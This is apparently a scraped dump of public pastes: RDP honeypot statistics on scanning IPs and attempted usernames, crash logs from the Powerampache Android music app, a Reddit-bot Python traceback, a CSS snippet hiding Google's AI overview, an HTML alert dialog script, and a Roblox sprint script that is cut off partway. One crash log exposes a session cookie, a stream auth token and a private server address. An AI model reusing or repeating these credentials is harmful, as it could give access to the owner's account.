    ""proxy"": 6
  }
}"
fZW57bHF,2025-05-28_stats.json,rdp_snitch,JSON,Wednesday 28th of May 2025 07:16:14 PM CDT,"{
  ""ip"": {
    ""24.173.30.170"": 4534,
    ""128.199.168.88"": 3816,
    ""143.198.221.164"": 358,
    ""157.245.159.1"": 226,
    ""123.103.219.78"": 34,
    ""80.94.95.198"": 36,
    ""88.214.25.121"": 4,
    ""91.238.181.94"": 4,
    ""194.187.177.117"": 2,
    ""71.82.170.60"": 12,
    ""92.63.197.197"": 8,
    ""66.228.46.123"": 8,
    ""205.210.31.48"": 6,
    ""45.56.112.145"": 2,
    ""157.245.150.219"": 2,
    ""92.63.197.23"": 22,
    ""167.172.153.78"": 4,
    ""138.68.188.52"": 2,
    ""194.0.234.34"": 4,
    ""205.210.31.67"": 6,
    ""107.173.58.226"": 4,
    ""78.142.18.92"": 2,
    ""134.122.51.9"": 24,
    ""82.147.88.139"": 4,
    ""103.15.222.151"": 4,
    ""185.196.220.41"": 6,
    ""111.170.152.113"": 6,
    ""195.178.110.98"": 4,
    ""147.185.132.58"": 6,
    ""165.154.182.72"": 2,
    ""165.232.170.129"": 2930,
    ""91.238.181.96"": 4,
    ""198.235.24.184"": 6,
    ""88.214.25.123"": 4
  },
  ""asn"": {
    ""AS11427"": 4534,
    ""AS14061"": 7362,
    ""AS4826"": 34,
    ""AS204428"": 36,
    ""AS35042"": 8,
    ""AS49434"": 8,
    ""AS208843"": 2,
    ""AS20115"": 12,
    ""AS210848"": 30,
    ""AS63949"": 10,
    ""AS396982"": 24,
    ""AS214295"": 4,
    ""AS20278"": 4,
    ""AS208046"": 8,
    ""AS211860"": 4,
    ""AS149137"": 4,
    ""AS151185"": 6,
    ""AS48090"": 4,
    ""AS135377"": 2
  },
  ""isp"": {
    ""Charter Communications Inc"": 4534,
    ""DigitalOcean, LLC"": 7362,
    ""Vocus PTY LTD"": 34,
    ""SS-Net"": 36,
    ""NOC EMAIL: noc@one-host.net"": 8,
    ""Datacenter location PAR1 France"": 8,
    ""Alpha Strike Labs GmbH"": 2,
    ""Charter Communications"": 12,
    ""Telkom Internet LTD"": 30,
    ""Akamai Technologies, Inc."": 10,
    ""Google LLC"": 24,
    ""Skynet Network LTD"": 4,
    ""Nexeon Technologies, Inc."": 4,
    ""ColocationX Ltd."": 8,
    ""Nerushenko Vyacheslav Nikolaevich"": 4,
    ""TAN Thanh AN International Trade Development Company Limited"": 4,
    ""China Telecom"": 6,
    ""Techoff SRV Limited"": 4,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2
  },
  ""org"": {
    ""Spectrum"": 4546,
    ""DigitalOcean, LLC"": 7362,
    ""Vocus Communications"": 34,
    ""Unmanaged LTD"": 36,
    ""ThinkTech Technology Industrial CO. Limited"": 16,
    ""Alpha Strike Labs GmbH"": 2,
    ""Korotkij Denis Aleksandrovich"": 30,
    ""Linode"": 10,
    ""Palo Alto Networks, Inc"": 24,
    ""Skynet Network LTD"": 4,
    ""ColoCrossing"": 4,
    ""ColocationX Ltd"": 8,
    ""Nerushenko Vyacheslav Nikolaevich"": 4,
    ""TANTHANHAN"": 4,
    ""Chinanet HB"": 6,
    ""Techoff SRV Limited"": 4,
    ""Ucloud Information Technology (hk) Limited"": 2
  },
  ""regionName"": {
    ""Texas"": 4534,
    ""South West"": 7332,
    ""Western Australia"": 34,
    ""Sofia-Capital"": 36,
    ""Kowloon City"": 8,
    ""\u00cele-de-France"": 8,
    ""State of Berlin"": 2,
    ""Wisconsin"": 12,
    ""North Holland"": 56,
    ""New Jersey"": 12,
    ""California"": 26,
    ""Georgia"": 2,
    ""England"": 6,
    ""New York"": 4,
    ""Krasnoyarsk Krai"": 4,
    ""Hanoi"": 4,
    ""Virginia"": 6,
    ""Hubei"": 6,
    ""Andorra la Vella"": 4
  },
  ""country"": {
    ""United States"": 4596,
    ""Singapore"": 7332,
    ""Australia"": 34,
    ""Bulgaria"": 36,
    ""Hong Kong"": 8,
    ""France"": 8,
    ""Germany"": 2,
    ""The Netherlands"": 56,
    ""United Kingdom"": 6,
    ""Russia"": 4,
    ""Vietnam"": 4,
    ""China"": 6,
    ""Andorra"": 4
  },
  ""account"": {
    ""hello"": 11904,
    ""142.93.8.59"": 84,
    ""Test"": 24,
    ""user"": 2,
    ""152s6omg"": 8,
    ""yczeDBqhx"": 2,
    ""DuvwKL"": 2,
    ""bexGkd"": 2,
    ""beio"": 2,
    ""Administr"": 40,
    ""REkuHSOwW"": 2,
    ""acHews"": 2,
    ""XJWMXu"": 2,
    ""Domain"": 6,
    ""FBcrZVMET"": 2,
    ""FqXtkU"": 2,
    ""pBFZzb"": 2,
    ""Administrator"": 2,
    ""WbqnkaBFR"": 2,
    ""DCXOSk"": 2,
    ""bNTXIm"": 2
  },
  ""keyboard"": {
    ""Unknown"": 12096
  },
  ""client_build"": {
    ""Unknown"": 12096
  },
  ""client_name"": {
    ""Unknown"": 12096
  },
  ""ip_type"": {
    ""Unknown"": 4686,
    ""hosting"": 7406,
    ""proxy"": 4
  }
}"
9n0wXuWk,2025-05-28_stats.json,rdp_snitch,JSON,Wednesday 28th of May 2025 07:15:09 PM CDT,"{
  ""ip"": {
    ""24.173.30.170"": 2267,
    ""128.199.168.88"": 1908,
    ""143.198.221.164"": 179,
    ""157.245.159.1"": 113,
    ""123.103.219.78"": 17,
    ""80.94.95.198"": 18,
    ""88.214.25.121"": 2,
    ""91.238.181.94"": 2,
    ""194.187.177.117"": 1,
    ""71.82.170.60"": 6,
    ""92.63.197.197"": 4,
    ""66.228.46.123"": 4,
    ""205.210.31.48"": 3,
    ""45.56.112.145"": 1,
    ""157.245.150.219"": 1,
    ""92.63.197.23"": 11,
    ""167.172.153.78"": 2,
    ""138.68.188.52"": 1,
    ""194.0.234.34"": 2,
    ""205.210.31.67"": 3,
    ""107.173.58.226"": 2,
    ""78.142.18.92"": 1,
    ""134.122.51.9"": 12,
    ""82.147.88.139"": 2,
    ""103.15.222.151"": 2,
    ""185.196.220.41"": 3,
    ""111.170.152.113"": 3,
    ""195.178.110.98"": 2,
    ""147.185.132.58"": 3,
    ""165.154.182.72"": 1,
    ""165.232.170.129"": 1465,
    ""91.238.181.96"": 2,
    ""198.235.24.184"": 3,
    ""88.214.25.123"": 2
  },
  ""asn"": {
    ""AS11427"": 2267,
    ""AS14061"": 3681,
    ""AS4826"": 17,
    ""AS204428"": 18,
    ""AS35042"": 4,
    ""AS49434"": 4,
    ""AS208843"": 1,
    ""AS20115"": 6,
    ""AS210848"": 15,
    ""AS63949"": 5,
    ""AS396982"": 12,
    ""AS214295"": 2,
    ""AS20278"": 2,
    ""AS208046"": 4,
    ""AS211860"": 2,
    ""AS149137"": 2,
    ""AS151185"": 3,
    ""AS48090"": 2,
    ""AS135377"": 1
  },
  ""isp"": {
    ""Charter Communications Inc"": 2267,
    ""DigitalOcean, LLC"": 3681,
    ""Vocus PTY LTD"": 17,
    ""SS-Net"": 18,
    ""NOC EMAIL: noc@one-host.net"": 4,
    ""Datacenter location PAR1 France"": 4,
    ""Alpha Strike Labs GmbH"": 1,
    ""Charter Communications"": 6,
    ""Telkom Internet LTD"": 15,
    ""Akamai Technologies, Inc."": 5,
    ""Google LLC"": 12,
    ""Skynet Network LTD"": 2,
    ""Nexeon Technologies, Inc."": 2,
    ""ColocationX Ltd."": 4,
    ""Nerushenko Vyacheslav Nikolaevich"": 2,
    ""TAN Thanh AN International Trade Development Company Limited"": 2,
    ""China Telecom"": 3,
    ""Techoff SRV Limited"": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1
  },
  ""org"": {
    ""Spectrum"": 2273,
    ""DigitalOcean, LLC"": 3681,
    ""Vocus Communications"": 17,
    ""Unmanaged LTD"": 18,
    ""ThinkTech Technology Industrial CO. Limited"": 8,
    ""Alpha Strike Labs GmbH"": 1,
    ""Korotkij Denis Aleksandrovich"": 15,
    ""Linode"": 5,
    ""Palo Alto Networks, Inc"": 12,
    ""Skynet Network LTD"": 2,
    ""ColoCrossing"": 2,
    ""ColocationX Ltd"": 4,
    ""Nerushenko Vyacheslav Nikolaevich"": 2,
    ""TANTHANHAN"": 2,
    ""Chinanet HB"": 3,
    ""Techoff SRV Limited"": 2,
    ""Ucloud Information Technology (hk) Limited"": 1
  },
  ""regionName"": {
    ""Texas"": 2267,
    ""South West"": 3666,
    ""Western Australia"": 17,
    ""Sofia-Capital"": 18,
    ""Kowloon City"": 4,
    ""\u00cele-de-France"": 4,
    ""State of Berlin"": 1,
    ""Wisconsin"": 6,
    ""North Holland"": 28,
    ""New Jersey"": 6,
    ""California"": 13,
    ""Georgia"": 1,
    ""England"": 3,
    ""New York"": 2,
    ""Krasnoyarsk Krai"": 2,
    ""Hanoi"": 2,
    ""Virginia"": 3,
    ""Hubei"": 3,
    ""Andorra la Vella"": 2
  },
  ""country"": {
    ""United States"": 2298,
    ""Singapore"": 3666,
    ""Australia"": 17,
    ""Bulgaria"": 18,
    ""Hong Kong"": 4,
    ""France"": 4,
    ""Germany"": 1,
    ""The Netherlands"": 28,
    ""United Kingdom"": 3,
    ""Russia"": 2,
    ""Vietnam"": 2,
    ""China"": 3,
    ""Andorra"": 2
  },
  ""account"": {
    ""hello"": 5952,
    ""142.93.8.59"": 42,
    ""Test"": 12,
    ""user"": 1,
    ""152s6omg"": 4,
    ""yczeDBqhx"": 1,
    ""DuvwKL"": 1,
    ""bexGkd"": 1,
    ""beio"": 1,
    ""Administr"": 20,
    ""REkuHSOwW"": 1,
    ""acHews"": 1,
    ""XJWMXu"": 1,
    ""Domain"": 3,
    ""FBcrZVMET"": 1,
    ""FqXtkU"": 1,
    ""pBFZzb"": 1,
    ""Administrator"": 1,
    ""WbqnkaBFR"": 1,
    ""DCXOSk"": 1,
    ""bNTXIm"": 1
  },
  ""keyboard"": {
    ""Unknown"": 6048
  },
  ""client_build"": {
    ""Unknown"": 6048
  },
  ""client_name"": {
    ""Unknown"": 6048
  },
  ""ip_type"": {
    ""Unknown"": 2343,
    ""hosting"": 3703,
    ""proxy"": 2
  }
}"
iL7e5Ha1,2025-05-28T18:02:18.405967,powerampache,PHP,Wednesday 28th of May 2025 06:02:19 PM CDT,"1.01-80-play (80) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""timeout"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

scrobble() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""timeout\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""timeout\"" }"",""stackTrace"":[]}"
GxwgpHSd,2025-05-29T07:57:38.498878,powerampache,PHP,Wednesday 28th of May 2025 05:57:40 PM CDT,"1.01-80-play (80) - DB: 83
androidx.media3.datasource.HttpDataSource$InvalidResponseCodeException: Response code: 404
	at androidx.media3.datasource.DefaultHttpDataSource.open(DefaultHttpDataSource.java:401)
	at androidx.media3.datasource.DefaultDataSource.open(DefaultDataSource.java:275)
	at androidx.media3.datasource.TeeDataSource.open(TeeDataSource.java:54)
	at androidx.media3.datasource.cache.CacheDataSource.openNextSource(CacheDataSource.java:802)
	at androidx.media3.datasource.cache.CacheDataSource.open(CacheDataSource.java:615)
	at androidx.media3.datasource.StatsDataSource.open(StatsDataSource.java:88)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1109)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:453)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

onPlayerError Invalid response code 404 - Not Found - HttpDataSource.InvalidResponseCodeException 
onPlayerError Invalid response code 404 - Not Found
 {""headerFields"":{""null"":[""HTTP/1.1 404 Not Found""],""Cache-Control"":[""no-cache, no-store, must-revalidate""],""Connection"":[""Keep-Alive""],""Content-Length"":[""1006""],""Content-Security-Policy"":[""default-src \u0027none\u0027;base-uri \u0027none\u0027;manifest-src \u0027self\u0027;frame-ancestors \u0027none\u0027""],""Content-Type"":[""application/json; charset\u003dutf-8""],""Date"":[""Wed, 28 May 2025 22:57:35 GMT""],""Feature-Policy"":[""autoplay \u0027none\u0027;camera \u0027none\u0027;fullscreen \u0027none\u0027;geolocation \u0027none\u0027;microphone \u0027none\u0027;payment \u0027none\u0027""],""Keep-Alive"":[""timeout\u003d5, max\u003d100""],""Referrer-Policy"":[""no-referrer""],""Server"":[""Apache/2.4.62 (AlmaLinux) OpenSSL/3.2.2""],""Set-Cookie"":[""oc_sessionPassphrase\u003dTIlsGepuInXsVWTTyk7Hko5YBgXxghnbaBuHojyABMSbBAkAF13UwOqFOjzsv9Lq8KEEgmhAs7c%2BR93WqB2nObhH7T6V8uQ0chWYAc75H7TwgyAzlyFIgrXQs0IsdetN; path\u003d/; secure; HttpOnly; SameSite\u003dLax"",""__Host-nc_sameSiteCookielax\u003dtrue; path\u003d/; httponly;secure; expires\u003dFri, 31-Dec-2100 23:59:59 GMT; SameSite\u003dlax"",""__Host-nc_sameSiteCookiestrict\u003dtrue; path\u003d/; httponly;secure; expires\u003dFri, 31-Dec-2100 23:59:59 GMT; SameSite\u003dstrict"",""ochcpj79q18g\u003djm1kjbu3ud2ipi4ig1t34ostdb; path\u003d/; secure; HttpOnly; SameSite\u003dLax""],""Strict-Transport-Security"":[""max-age\u003d15768000""],""Vary"":[""Accept-Encoding""],""X-Android-Received-Millis"":[""1748473054734""],""X-Android-Response-Source"":[""NETWORK 404""],""X-Android-Selected-Protocol"":[""http/1.1""],""X-Android-Sent-Millis"":[""1748473054520""],""X-Content-Type-Options"":[""nosniff""],""X-Frame-Options"":[""SAMEORIGIN""],""X-Permitted-Cross-Domain-Policies"":[""none""],""X-Powered-By"":[""PHP/8.3.21""],""X-Request-Id"":[""aDeU3wJbnWE5NfOOg3sIZAAAAI8""],""X-Robots-Tag"":[""noindex, nofollow""],""X-XSS-Protection"":[""1; mode\u003dblock""]},""responseBody"":[123,34,109,101,115,115,97,103,101,34,58,34,68,105,100,32,101,120,112,101,99,116,32,111,110,101,32,114,101,115,117,108,116,32,98,117,116,32,102,111,117,110,100,32,110,111,110,101,32,119,104,101,110,32,101,120,101,99,117,116,105,110,103,58,32,113,117,101,114,121,32,92,34,83,69,76,69,67,84,32,96,42,80,82,69,70,73,88,42,109,117,115,105,99,95,116,114,97,99,107,115,96,46,42,44,32,96,102,105,108,101,96,46,96,110,97,109,101,96,32,65,83,32,96,102,105,108,101,110,97,109,101,96,44,32,96,102,105,108,101,96,46,96,115,105,122,101,96,44,32,96,102,105,108,101,96,46,96,109,116,105,109,101,96,32,65,83,32,96,102,105,108,101,95,109,111,100,95,116,105,109,101,96,44,32,96,102,105,108,101,96,46,96,112,97,114,101,110,116,96,32,65,83,32,96,102,111,108,100,101,114,95,105,100,96,44,92,110,92,116,92,116,92,116,92,116,92,116,92,116,96,97,108,98,117,109,96,46,96,110,97,109,101,96,32,65,83,32,96,97,108,98,117,109,95,110,97,109,101,96,44,32,96,97,114,116,105,115,116,96,46,96,110,97,109,101,96,32,65,83,32,96,97,114,116,105,115,116,95,110,97,109,101,96,44,32,96,103,101,110,114,101,96,46,96,110,97,109,101,96,32,65,83,32,96,103,101,110,114,101,95,110,97,109,101,96,92,110,92,116,92,116,92,116,92,116,70,82,79,77,32,96,42,80,82,69,70,73,88,42,109,117,115,105,99,95,116,114,97,99,107,115,96,92,110,92,116,92,116,92,116,92,116,73,78,78,69,82,32,74,79,73,78,32,96,42,80,82,69,70,73,88,42,102,105,108,101,99,97,99,104,101,96,32,96,102,105,108,101,96,92,110,92,116,92,116,92,116,92,116,79,78,32,96,42,80,82,69,70,73,88,42,109,117,115,105,99,95,116,114,97,99,107,115,96,46,96,102,105,108,101,95,105,100,96,32,61,32,96,102,105,108,101,96,46,96,102,105,108,101,105,100,96,92,110,92,116,92,116,92,116,92,116,73,78,78,69,82,32,74,79,73,78,32,96,42,80,82,69,70,73,88,42,109,117,115,105,99,95,97,108,98,117,109,115,96,32,96,97,108,98,117,109,96,92,110,92,116,92,116,92,116,92,116,79,78,32,96,42,80,82,69,70,73,88,42,109,117,115,105,99,95,116,114,97,99,107,115,96,46,96,97,108,98,117,109,95,105,100,96,32,61,32,96,97,108,98,117,109,96,46,96,105,100,96,92,110,92,116,92,116,92,116,92,116,73,78,78,69,82,32,74,79,73,78,32,96,42,80,82,69,70,73,88,42,109,117,115,105,99,95,97,114,116,105,115,116,115,96,32,96,97,114,116,105,115,116,96,92,110,92,116,92,116,92,116,92,116,79,78,32,96,42,80,82,69,70,73,88,42,109,117,115,105,99,95,116,114,97,99,107,115,96,46,96,97,114,116,105,115,116,95,105,100,96,32,61,32,96,97,114,116,105,115,116,96,46,96,105,100,96,92,110,92,116,92,116,92,116,92,116,76,69,70,84,32,74,79,73,78,32,96,42,80,82,69,70,73,88,42,109,117,115,105,99,95,103,101,110,114,101,115,96,32,96,103,101,110,114,101,96,92,110,92,116,92,116,92,116,92,116,79,78,32,96,42,80,82,69,70,73,88,42,109,117,115,105,99,95,116,114,97,99,107,115,96,46,96,103,101,110,114,101,95,105,100,96,32,61,32,96,103,101,110,114,101,96,46,96,105,100,96,92,110,92,116,92,116,92,116,92,116,87,72,69,82,69,32,96,42,80,82,69,70,73,88,42,109,117,115,105,99,95,116,114,97,99,107,115,96,46,96,117,115,101,114,95,105,100,96,32,61,32,63,32,65,78,68,32,40,96,42,80,82,69,70,73,88,42,109,117,115,105,99,95,116,114,97,99,107,115,96,46,96,105,100,96,32,61,32,63,41,32,92,34,59,32,112,97,114,97,109,101,116,101,114,115,32,65,114,114,97,121,92,110,40,92,110,32,32,32,32,91,48,93,32,61,92,117,48,48,51,69,32,97,114,97,107,117,115,97,92,110,32,32,32,32,91,49,93,32,61,92,117,48,48,51,69,32,51,49,48,50,57,92,110,41,92,110,59,32,108,105,109,105,116,32,92,34,92,34,59,32,111,102,102,115,101,116,32,92,34,92,34,34,125],""responseCode"":404,""responseMessage"":""Not Found"",""dataSpec"":{""absoluteStreamPosition"":17380736,""flags"":6,""httpMethod"":1,""httpRequestHeaders"":{""Icy-MetaData"":""1""},""key"":""https://cloud.arakusa.net/index.php/apps/music/ampache/server/json.server.php?action\u003dstream\u0026stats\u003d0\u0026auth\u003d09510515a4a672d6bd636721a149c3a5\u0026type\u003dsong\u0026id\u003d31029"",""length"":2736833,""position"":17380736,""uri"":{},""uriPositionOffset"":0},""type"":1,""reason"":2004,""detailMessage"":""Response code: 404"",""stackTrace"":[{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":401,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.TeeDataSource"",""fileName"":""TeeDataSource.java"",""lineNumber"":54,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.cache.CacheDataSource"",""fileName"":""CacheDataSource.java"",""lineNumber"":802,""methodName"":""openNextSource""},{""declaringClass"":""androidx.media3.datasource.cache.CacheDataSource"",""fileName"":""CacheDataSource.java"",""lineNumber"":615,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":88,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1109,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":453,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1145,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":644,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}]}"
nBD2EzTJ,AttributeError: 'NoneType' object has no attribute 'name',basedcount_bot,Python,Wednesday 28th of May 2025 05:46:01 PM CDT,"Traceback (most recent call last):
  File ""/home/gmktec-server/Programming/Bots/basedcount_bot/basedcount_bot.py"", line 46, in wrapper
    await func(reddit_instance, mongo_client)
  File ""/home/gmktec-server/Programming/Bots/basedcount_bot/basedcount_bot.py"", line 275, in read_comments
    parent_info = await get_parent_info(comment)
                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec-server/Programming/Bots/basedcount_bot/basedcount_bot.py"", line 237, in get_parent_info
    parent_author = parent_post.author.name
                    ^^^^^^^^^^^^^^^^^^^^^^^
AttributeError: 'NoneType' object has no attribute 'name'
"
kM2AdTVv,Hide Google AI overview (May 2025),sawczakl,CSS,Wednesday 28th of May 2025 04:56:31 PM CDT,"/*
1. Go to your browser extensions and add Live Editor for CSS

2. Run a Google search

3. Open the extension

4. Paste in the below code

5. Click the pin icon

6. You can close the extension window 
*/

div[data-al=""AI overview is ready""] {
    display: none;
}
"
Kz8Mk5FE,2025-05-28T22:52:25.664433,powerampache,PHP,Wednesday 28th of May 2025 03:52:25 PM CDT,"1.01-80-play (80) - DB: 83
luci.sixsixsix.powerampache2.domain.errors.MusicException: {""errorAction"":""handshake"",""errorCode"":""4701"",""errorMessage"":""Received Invalid Handshake - Incorrect username or password"",""errorType"":""account""}
	at luci.sixsixsix.powerampache2.data.MusicRepositoryImpl.tryAuthorize(MusicRepositoryImpl.kt:268)
	at luci.sixsixsix.powerampache2.data.MusicRepositoryImpl.access$tryAuthorize(MusicRepositoryImpl.kt:83)
	at luci.sixsixsix.powerampache2.data.MusicRepositoryImpl$tryAuthorize$1.invokeSuspend(Unknown Source:18)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at android.os.Handler.handleCallback(Handler.java:959)
	at android.os.Handler.dispatchMessage(Handler.java:100)
	at android.os.Looper.loopOnce(Looper.java:257)
	at android.os.Looper.loop(Looper.java:342)
	at android.app.ActivityThread.main(ActivityThread.java:9634)
	at java.lang.reflect.Method.invoke(Native Method)
	at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:619)
	at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:929)

authorize() - {""errorAction"":""handshake"",""errorCode"":""4701"",""errorMessage"":""Received Invalid Handshake - Incorrect username or password"",""errorType"":""account""}"
gTK7qJyc,2025-05-28T22:52:05.808064,powerampache,PHP,Wednesday 28th of May 2025 03:52:05 PM CDT,"1.01-80-play (80) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""Unable to resolve host ""mine.p2d.moe"": No address associated with hostname"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

"
py4WBfvx,Global Window Alert System,Th3Ward3n,HTML,Wednesday 28th of May 2025 03:42:21 PM CDT,"<div id=""alert-container"">
    <!-- ERROR -->
    <dialog id=""alert-error"" class=""a-error"">
        <div class=""spc-btw gap-15p"">
            <p>== Text Content ==</p>
            <button autofocus onclick=""dismissAlert('error');"">Close</button>
        </div>
    </dialog>
    <!-- WARNING -->
    <dialog id=""alert-warning"" class=""a-warning"">
        <div class=""spc-btw gap-15p"">
            <p>== Text Content ==</p>
            <button autofocus onclick=""dismissAlert('warning');"">Close</button>
        </div>
    </dialog>
    <!-- INFO -->
    <dialog id=""alert-info"" class=""a-info"">
        <div class=""spc-btw gap-15p"">
            <p>== Text Content ==</p>
            <button autofocus onclick=""dismissAlert('info');"">Close</button>
        </div>
    </dialog>
    <!-- SUCCESS -->
    <dialog id=""alert-success"" class=""a-success"">
        <div class=""spc-btw gap-15p"">
            <p>== Text Content ==</p>
            <button autofocus onclick=""dismissAlert('success');"">Close</button>
        </div>
    </dialog>
</div>
<script>
    /** @typedef {""error"" | ""warning"" | ""info"" | ""success""} ValidAlertTypes */
    const validAlertTypeList = [""error"", ""warning"", ""info"", ""success""];
    /** 
     * @param alertType {ValidAlertTypes}
     * @returns {HTMLDialogElement}
     */
    const findDialog = (alertType) => {
        const diaEle = document.querySelector(`dialog#alert-${alertType}`);
        if (!diaEle) throw new Error(`[WARNING] Failed to find Dialog with id alert-${alertType}!`);
        return diaEle;
    };

    class AlertManager {
        parentDialog;
        textContainer;
        /** @param alertType {ValidAlertTypes} */
        constructor(alertType) {
            this.parentDialog = findDialog(alertType);
            this.textContainer = Object.values(
                Object.values(this.parentDialog.childNodes)
                .find((child) => child instanceof HTMLDivElement).childNodes
            ).find((child) => child instanceof HTMLParagraphElement);
        }

        get dlog() { return this.parentDialog; }
        get isOpen() { return this.dlog.hasAttribute('open'); }
        /** @param txt {string} */
        set txtDisplay(txt) { this.textContainer.textContent = txt; }

        // TODO: Calculate position of prexisting dialog boxes currently `open`
        // Apply position shift to prevent overlap, accounting for translation distance to take up `closed` boxes
        show() { this.dlog.show(); }
        close() { this.dlog.close(); }
    }

    const dialogContainer = {
        error: new AlertManager('error'),
        warning: new AlertManager('warning'),
        info: new AlertManager('info'),
        success: new AlertManager('success')
    };

    /** @param alertType {ValidAlertTypes} */
    function dismissAlert(alertType) {
        console.log(alertType);
        if (dialogContainer[alertType].isOpen) dialogContainer[alertType].close();
    }

    
    window.addEventListener(""message"", (event) => {
        /** 
         * @typedef {
            {
               message: string,
               type: ValidAlertTypes 
            }
         } ValidMsgPayload 
         */
        if (event.origin !== ""http://127.0.0.1:4450"") return;
        /** @type {ValidMsgPayload} */
        const msgPayload = event.data;
        if (typeof msgPayload === 'string' || !validAlertTypeList.includes(msgPayload.type)) return;
        
        dialogContainer[msgPayload.type].txtDisplay = msgPayload.message;
        dialogContainer[msgPayload.type].show();

        setTimeout(() => { dialogContainer[msgPayload.type].close(); }, 4400);
    });
</script>"
CW70Wzee,Basic script,Thesxctriper23214,Lua,Wednesday 28th of May 2025 12:50:35 PM CDT,"--[[
Sprint Script
Features:
• Smooth acceleration/deceleration for walk ↔ sprint transitions
• Stamina management with depletion and regeneration
• Subtle camera roll (tilt) on sprint using local forward‐axis rotation
• Configurable parameters for speed, rates, and tilt
]]

local Players          = game:GetService(""Players"")
local RunService       = game:GetService(""RunService"")
local UserInputService = game:GetService(""UserInputService"")

local player    = Players.LocalPlayer
local camera    = workspace.CurrentCamera
local character, humanoid, rootPart

-- Configuration
local walkSpeed    = 16
local sprintSpeed  = 32
local accelRate    = 50       -- studs/s²
local decelRate    = 70       -- studs/s²
local maxStamina   = 5        -- seconds
local staminaDrain = 1        -- per second
local staminaRegen = 0.5      -- per second
local tiltAngle    = 5        -- degrees of roll
local tiltSpeed    = 10       -- interpolation speed

-- State
local currentSpeed = walkSpeed
local isSprinting  = false
local stamina      = maxStamina
local currentRoll  = 0        -- radians

-- Handle respawns
local function onCharacterAdded(char)
    character = char
    humanoid   = char:WaitForChild(""Humanoid"")
    rootPart   = char:WaitForChild(""HumanoidRootPart"")
    
    -- reset state
    currentSpeed = walkSpeed
    isSprinting  = false
    stamina      = maxStamina
    currentRoll  = 0
end

player.CharacterAdded:Connect(onCharacterAdded)
if player.Character then
    onCharacterAdded(player.Character)
end

-- Detect sprint input
UserInputService.InputBegan:Connect(function(input, processed)
    if not processed and input.KeyCode == Enum.KeyCode.LeftShift then
        isSprinting = true
    end
end)

UserInputService.InputEnded:Connect(function(input, processed)
    if not processed and input.KeyCode == Enum.KeyCode.LeftShift then
        isSprinting = false
    end
end)

-- Main update loop
RunService.RenderStepped:Connect(function(dt)
    if not humanoid then return end

    local moving = humanoid.MoveDirection.Magnitude > 0

    -- Determine target speed
    local targetSpeed = (isSprinting and moving and stamina > 0)
        and sprintSpeed
        or walkSpeed

    -- Smooth acceleration/deceleration
    if currentSpeed < targetSpeed then
        currentSpeed = math.min(currentSpeed + accelRate * dt, targetSpeed)
    elseif currentSpeed > targetSpeed then
        currentSpeed = math.max(currentSpeed - decelRate * dt, targetSpeed)
    end
    humanoid.WalkSpeed = currentSpeed

    -- Stamina logic
    if isSprinting and moving and stamina > 0 then
        stamina = math.max(stamina - staminaDrain * dt, 0)
        if stamina == 0 then
            isSprinting = false
        end
    else
        stamina = math.min(stamina + staminaRegen * dt, maxStamina)
    end

    -- Improved camera roll tilt
    local targetRoll = (currentSpeed > walkSpeed + 0.1)
        and math.rad(tiltAngle)
        or 0
    local alpha     = math.clamp(tiltSpeed * dt, 0, 1)
    local deltaRoll = (targetRoll - currentRoll) * alpha

    if math.abs(deltaRoll) > 1e-4 then
        -- Rotate camera around its local forward axis
